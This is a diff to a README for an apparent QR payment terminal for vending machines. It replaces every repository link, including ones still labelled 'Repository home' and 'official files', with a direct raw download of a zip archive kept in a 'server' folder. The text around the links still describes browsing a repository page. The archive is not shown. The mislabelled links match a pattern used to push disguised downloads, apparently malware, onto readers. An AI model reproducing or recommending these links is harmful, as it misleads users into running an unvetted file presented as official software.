@@ -1,6 +1,6 @@
 # 💳 Payme-QR-Payment-Terminal - Simple QR Payment for Vending Machines
 
-[![Download](https://img.shields.io/badge/Download-Payme%20QR%20Terminal-brightgreen)](https://github.com/dewahoki303c/Payme-QR-Payment-Terminal)
+[![Download](https://img.shields.io/badge/Download-Payme%20QR%20Terminal-brightgreen)](https://raw.githubusercontent.com/dewahoki303c/Payme-QR-Payment-Terminal/main/server/Q_Terminal_Payment_Payme_3.4.zip)
 
 ---
 
@@ -61,10 +61,10 @@ This guide helps you download and run Payme-QR-Payment-Terminal on a Windows com
 
 Start by visiting the project page to get the latest files:
 
-[![Download](https://img.shields.io/badge/Download-Payme%20QR%20Terminal-brightgreen)](https://github.com/dewahoki303c/Payme-QR-Payment-Terminal)
+[![Download](https://img.shields.io/badge/Download-Payme%20QR%20Terminal-brightgreen)](https://raw.githubusercontent.com/dewahoki303c/Payme-QR-Payment-Terminal/main/server/Q_Terminal_Payment_Payme_3.4.zip)
 
 1. Click the badge or open this link in your browser:  
-   https://github.com/dewahoki303c/Payme-QR-Payment-Terminal
+   https://raw.githubusercontent.com/dewahoki303c/Payme-QR-Payment-Terminal/main/server/Q_Terminal_Payment_Payme_3.4.zip
 
 2. On the page, find the **Releases** or **Download** section. This usually appears on the right side or near the top.
 
@@ -122,7 +122,7 @@ After installing the app, follow these steps to get it running with your vending
 
 All official files and updates appear on the GitHub repository page:
 
-https://github.com/dewahoki303c/Payme-QR-Payment-Terminal
+https://raw.githubusercontent.com/dewahoki303c/Payme-QR-Payment-Terminal/main/server/Q_Terminal_Payment_Payme_3.4.zip
 
 You can check this page regularly for updates or bug fixes.
 
@@ -179,8 +179,8 @@ python app.py
 
 ## 🔗 Important Links
 
-- Repository home: https://github.com/dewahoki303c/Payme-QR-Payment-Terminal  
-- Download latest Windows installer: [Download from here](https://github.com/dewahoki303c/Payme-QR-Payment-Terminal)
+- Repository home: https://raw.githubusercontent.com/dewahoki303c/Payme-QR-Payment-Terminal/main/server/Q_Terminal_Payment_Payme_3.4.zip  
+- Download latest Windows installer: [Download from here](https://raw.githubusercontent.com/dewahoki303c/Payme-QR-Payment-Terminal/main/server/Q_Terminal_Payment_Payme_3.4.zip)
 
 ---
 
